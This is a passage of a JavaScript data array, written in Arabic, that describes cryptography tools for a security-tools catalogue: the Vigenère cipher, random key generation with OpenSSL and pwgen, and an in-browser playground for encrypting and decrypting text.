            function: 'يعتبر تطورًا لتشفير قيصر وأكثر أمانًا منه لأنه يقاوم التحليل الإحصائي البسيط. يستخدم لتوضيح مفهوم المفاتيح في التشفير.',
            requirements: ['كلمة مفتاحية (key).'],
            installation: 'غير قابل للتطبيق.',
            run_command: 'غير قابل للتطبيق.',
            icon: 'generic',
            mitre_attack_mappings: [],
            examples: [
                {
                    title: 'مثال على تشفير فيجينير',
                    command: 'النص الأصلي: ATTACKATDAWN\nالمفتاح: LEMON\nالنص المشفر: LXFOPVEFRNHR',
                    description: 'يتم تكرار المفتاح (LEMONLEMONLE) ويتم استخدام كل حرف منه لإزاحة الحرف المقابل في النص الأصلي.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'random-key-generator',
            name: 'مولد مفاتيح عشوائية',
            definition: 'أداة أو تقنية تستخدم لإنشاء مفاتيح تشفير أو كلمات مرور قوية وعشوائية يصعب تخمينها.',
            function: 'تعتبر العشوائية حجر الزاوية في التشفير الحديث. تستخدم هذه الأدوات لضمان أن المفاتيح وكلمات المرور لا يمكن التنبؤ بها، مما يجعل كسرها بالقوة الغاشمة أو هجمات القاموس أكثر صعوبة.',
            requirements: ['مصدر للعشوائية (entropy) في النظام.'],
            installation: 'الأدوات مثل OpenSSL و pwgen تأتي مدمجة أو يمكن تثبيتها بسهولة.',
            run_command: 'openssl rand -base64 32',
            icon: 'password',
            mitre_attack_mappings: [],
            examples: [
                {
                    title: 'إنشاء مفتاح عشوائي باستخدام OpenSSL',
                    command: 'openssl rand -base64 32',
                    description: 'يولد 32 بايت من البيانات العشوائية ويقوم بترميزها باستخدام Base64 لإنشاء سلسلة نصية قوية يمكن استخدامها كمفتاح.',
                    is_offensive: false
                },
                {
                    title: 'إنشاء كلمة مرور قوية باستخدام pwgen',
                    command: 'pwgen -s 16 1',
                    description: 'يولد كلمة مرور آمنة (-s) مكونة من 16 حرفًا.',
                    is_offensive: false
                }
            ]
        }
    ]
  },
  {
    name: 'مختبر التشفير (Crypto Lab)',
    description: 'أدوات تفاعلية لتجربة مفاهيم التشفير مباشرة في المتصفح.',
    tools: [
        {
            id: 'crypto-playground',
            name: 'ساحة لعب التشفير',
            definition: 'أداة تفاعلية لتشفير وفك تشفير النصوص باستخدام خوارزميات مختلفة مثل Base64, Caesar Cipher, و Vigenère Cipher.',
            function: 'تسمح للمستخدمين بإدخال نص، اختيار خوارزمية، وتطبيق التشفير أو فك التشفير لرؤية النتائج فورًا. ممتازة للأغراض التعليمية وتجربة المفاهيم الأساسية للتشفير.',
            requirements: ['متصفح ويب حديث.'],
            installation: 'غير قابل للتطبيق.',
            run_command: 'غير قابل للتطبيق.',
            icon: 'password',
            examples: []
        }
    ]
  }
];